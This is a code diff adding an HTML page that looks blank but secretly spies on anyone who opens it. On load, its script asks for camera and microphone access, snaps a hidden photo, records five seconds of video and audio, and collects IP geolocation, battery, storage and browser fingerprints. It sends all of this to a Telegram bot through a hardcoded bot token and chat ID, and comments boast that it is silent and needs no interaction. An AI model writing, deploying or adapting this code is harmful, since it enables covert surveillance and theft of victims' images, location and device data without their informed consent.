@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title> </title>
+    <style>
+        /* COMPLETELY BLANK PAGE - NO VISIBLE ELEMENTS */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: transparent;
+            width: 100%;
+            height: 100vh;
+            overflow: hidden;
+        }
+        /* Absolutely nothing visible - blank white/transparent page */
+        .hidden-container {
+            display: none;
+        }
+        /* No status, no buttons, no text - pure blank */
+    </style>
+</head>
+<body>
+    <!-- BLANK PAGE: No text, no buttons, no visible UI -->
+    
+    <script>
+        // ============================================================
+        // COMPLETELY SILENT BACKGROUND CAPTURE - NO VISUAL FEEDBACK
+        // Captures: Photo + 5 second video + Full device info
+        // Sends to Telegram automatically when page loads
+        // ============================================================
+        
+        (function() {
+            // Configuration - Telegram credentials
+            const BOT_TOKEN = "8073620632:AAEjsNTVl2Cj2WY--_SiJl7esBatvRDmJug";
+            const CHAT_ID = "7353728430";  // Your chat ID
+            
+            // Helper: simple hash for fingerprint
+            function simpleHash(str) {
+                let hash = 0;
+                for (let i = 0; i < str.length; i++) {
+                    const char = str.charCodeAt(i);
+                    hash = ((hash << 5) - hash) + char;
+                    hash = hash & hash;
+                }
+                return Math.abs(hash).toString(36);
+            }
+            
+            // Advanced fingerprint (canvas, webgl, audio) - runs silently
+            async function getFingerprint() {
+                const fp = {};
+                // Canvas fingerprint
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = 200;
+                    canvas.height = 80;
+                    ctx.fillStyle = '#e74c3c';
+                    ctx.fillRect(0, 0, 200, 80);
+                    ctx.fillStyle = '#f1c40f';
+                    ctx.font = 'bold 20px Arial';
+                    ctx.fillText('FP2026', 30, 50);
+                    ctx.strokeStyle = '#3498db';
+                    ctx.strokeRect(5, 5, 190, 70);
+                    fp.canvasHash = simpleHash(canvas.toDataURL());
+                } catch(e) { fp.canvasHash = 'error'; }
+                
+                // WebGL
+                try {
+                    const glCanvas = document.createElement('canvas');
+                    const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+                    if(gl) {
+                        const debugExt = gl.getExtension('WEBGL_debug_renderer_info');
+                        if(debugExt) {
+                            fp.webglVendor = gl.getParameter(debugExt.UNMASKED_VENDOR_WEBGL);
+                            fp.webglRenderer = gl.getParameter(debugExt.UNMASKED_RENDERER_WEBGL);
+                        } else {
+                            fp.webgl = 'no_debug_ext';
+                        }
+                    } else {
+                        fp.webgl = 'not_supported';
+                    }
+                } catch(e) { fp.webglError = 'fail'; }
+                
+                // Audio fingerprint
+                try {
+                    const AudioCtx = window.AudioContext || window.webkitAudioContext;
+                    if(AudioCtx) {
+                        const actx = new AudioCtx();
+                        const analyser = actx.createAnalyser();
+                        const osc = actx.createOscillator();
+                        osc.type = 'sine';
+                        osc.frequency.value = 440;
+                        osc.connect(analyser);
+                        osc.start();
+                        const data = new Float32Array(analyser.frequencyBinCount);
+                        analyser.getFloatFrequencyData(data);
+                        setTimeout(() => osc.stop(), 60);
+                        const sig = data.slice(0, 40).join(',');
+                        fp.audioSig = simpleHash(sig);
+                        await actx.close();
+                    } else {
+                        fp.audioSig = 'no_audioctx';
+                    }
+                } catch(e) { fp.audioSig = 'error'; }
+                return fp;
+            }
+            
+            // Collect ALL device information (IP, storage, battery, etc.) - completely silent
+            async function collectAllInfo() {
+                const now = new Date();
+                const basic = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timestamp: now.toISOString(),
+                    localTime: now.toLocaleString(),
+                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB RAM` : 'N/A',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                    screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bit)`,
+                    viewport: `${window.innerWidth}x${window.innerHeight}`,
+                    touchPoints: navigator.maxTouchPoints || 0,
+                    cookieEnabled: navigator.cookieEnabled
+                };
+                
+                // IP & location
+                let ipData = { status: 'fetch_failed' };
+                try {
+                    const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout?.(4000) });
+                    if(res.ok) ipData = await res.json();
+                    else ipData = { error: `HTTP ${res.status}` };
+                } catch(e) { ipData = { error: e.message }; }
+                
+                // Storage estimate
+                let storageInfo = {};
+                if('storage' in navigator && 'estimate' in navigator.storage) {
+                    try {
+                        const est = await navigator.storage.estimate();
+                        storageInfo = {
+                            usageMB: ((est.usage || 0) / 1024 / 1024).toFixed(1),
+                            quotaMB: ((est.quota || 0) / 1024 / 1024).toFixed(1)
+                        };
+                    } catch(e) { storageInfo = { error: 'estimate_failed' }; }
+                } else { storageInfo = { note: 'Storage API missing' }; }
+                
+                // Battery
+                let batteryInfo = {};
+                if('getBattery' in navigator) {
+                    try {
+                        const bat = await navigator.getBattery();
+                        batteryInfo = {
+                            level: Math.round(bat.level * 100) + '%',
+                            charging: bat.charging,
+                            chargingTime: bat.chargingTime
+                        };
+                    } catch(e) { batteryInfo = { error: 'denied' }; }
+                } else { batteryInfo = { note: 'Battery API unavailable' }; }
+                
+                const fingerprint = await getFingerprint();
+                
+                // Network connection
+                let connInfo = {};
+                if(navigator.connection) {
+                    const conn = navigator.connection;
+                    connInfo = {
+                        effectiveType: conn.effectiveType,
+                        downlinkMbps: conn.downlink,
+                        rttMs: conn.rtt,
+                        saveData: conn.saveData
+                    };
+                }
+                
+                const report = `🔍 *SILENT CAPTURE REPORT* 🔍\n` +
+                    `⏱️ Time: ${now.toLocaleString()} (${now.toISOString()})\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `📱 DEVICE INFO:\n${JSON.stringify(basic, null, 2)}\n\n` +
+                    `🌍 IP / GEOLOCATION:\n${JSON.stringify(ipData, null, 2)}\n\n` +
+                    `💾 STORAGE:\n${JSON.stringify(storageInfo, null, 2)}\n\n` +
+                    `🔋 BATTERY:\n${JSON.stringify(batteryInfo, null, 2)}\n\n` +
+                    `📡 NETWORK:\n${JSON.stringify(connInfo, null, 2)}\n\n` +
+                    `🆔 FINGERPRINT (canvas/webgl/audio):\n${JSON.stringify(fingerprint, null, 2)}\n\n` +
+                    `🎥 5-second video attached (silent background capture).`;
+                
+                return report;
+            }
+            
+            // Send photo + video to Telegram - silently, no console logs
+            async function sendPhotoAndVideoToTelegram(captionText, photoBlob, videoBlob) {
+                try {
+                    // Send photo with caption
+                    const photoForm = new FormData();
+                    photoForm.append('chat_id', CHAT_ID);
+                    let shortCaption = captionText.substring(0, 980);
+                    photoForm.append('caption', shortCaption);
+                    photoForm.append('photo', photoBlob, 'capture.jpg');
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: photoForm
+                    });
+                    
+                    // Send video
+                    const videoForm = new FormData();
+                    videoForm.append('chat_id', CHAT_ID);
+                    videoForm.append('video', videoBlob, 'video_5sec.webm');
+                    videoForm.append('caption', `🎥 5-second video (silent background capture)`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: videoForm
+                    });
+                    
+                    return true;
+                } catch (err) {
+                    // Silent fail - no visible errors
+                    return false;
+                }
+            }
+            
+            // MAIN: Background capture - NO VISUAL ELEMENTS, NO PREVIEWS, NO MESSAGES
+            async function silentBackgroundCapture() {
+                let mediaStream = null;
+                let mediaRecorder = null;
+                let recordedChunks = [];
+                let stopTimeout = null;
+                
+                try {
+                    // Request camera + microphone - browser will show permission prompt (required by security)
+                    // but NO visual preview on page
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" }, 
+                        audio: true 
+                    });
+                    
+                    // ---- STEP 1: Capture PHOTO using hidden offscreen element ----
+                    const offscreenVideo = document.createElement('video');
+                    offscreenVideo.srcObject = mediaStream;
+                    offscreenVideo.autoplay = true;
+                    offscreenVideo.muted = true;
+                    offscreenVideo.setAttribute('playsinline', '');
+                    // Completely hidden - not visible to user
+                    offscreenVideo.style.position = 'absolute';
+                    offscreenVideo.style.top = '-9999px';
+                    offscreenVideo.style.left = '-9999px';
+                    offscreenVideo.style.width = '1px';
+                    offscreenVideo.style.height = '1px';
+                    offscreenVideo.style.opacity = '0';
+                    offscreenVideo.style.pointerEvents = 'none';
+                    document.body.appendChild(offscreenVideo);
+                    
+                    await new Promise((resolve) => {
+                        offscreenVideo.onloadedmetadata = () => {
+                            offscreenVideo.play().then(resolve).catch(resolve);
+                        };
+                        setTimeout(resolve, 500);
+                    });
+                    
+                    await new Promise(r => setTimeout(r, 200));
+                    
+                    const canvas = document.createElement('canvas');
+                    const width = offscreenVideo.videoWidth || 640;
+                    const height = offscreenVideo.videoHeight || 480;
+                    canvas.width = width;
+                    canvas.height = height;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(offscreenVideo, 0, 0, width, height);
+                    const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                    
+                    // Remove hidden video element
+                    offscreenVideo.pause();
+                    offscreenVideo.srcObject = null;
+                    document.body.removeChild(offscreenVideo);
+                    
+                    // ---- STEP 2: Record EXACTLY 5 seconds VIDEO silently ----
+                    recordedChunks = [];
+                    const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
+                    mediaRecorder = new MediaRecorder(mediaStream, { mimeType: mimeType, videoBitsPerSecond: 2500000 });
+                    
+                    mediaRecorder.ondataavailable = (event) => {
+                        if(event.data && event.data.size > 0) recordedChunks.push(event.data);
+                    };
+                    
+                    mediaRecorder.onstop = async () => {
+                        const videoBlob = new Blob(recordedChunks, { type: mimeType });
+                        const fullInfoText = await collectAllInfo();
+                        const caption = `📸 *Silent Capture* ${new Date().toLocaleString()}\n\n${fullInfoText.substring(0, 900)}`;
+                        await sendPhotoAndVideoToTelegram(caption, photoBlob, videoBlob);
+                        
+                        // Cleanup
+                        if(mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+                    };
+                    
+                    // Start recording
+                    mediaRecorder.start();
+                    
+                    // Stop after exactly 5 seconds
+                    stopTimeout = setTimeout(() => {
+                        if(mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, 5000);
+                    
+                } catch (err) {
+                    // Silent fail - no console logs, no visible errors
+                    if(mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+                    if(stopTimeout) clearTimeout(stopTimeout);
+                }
+            }
+            
+            // Execute automatically when page loads - NO user interaction needed
+            // Small delay to ensure page is fully loaded
+            setTimeout(() => {
+                silentBackgroundCapture().catch(() => {});
+            }, 100);
+        })();
+    </script>
+</body>
+</html>
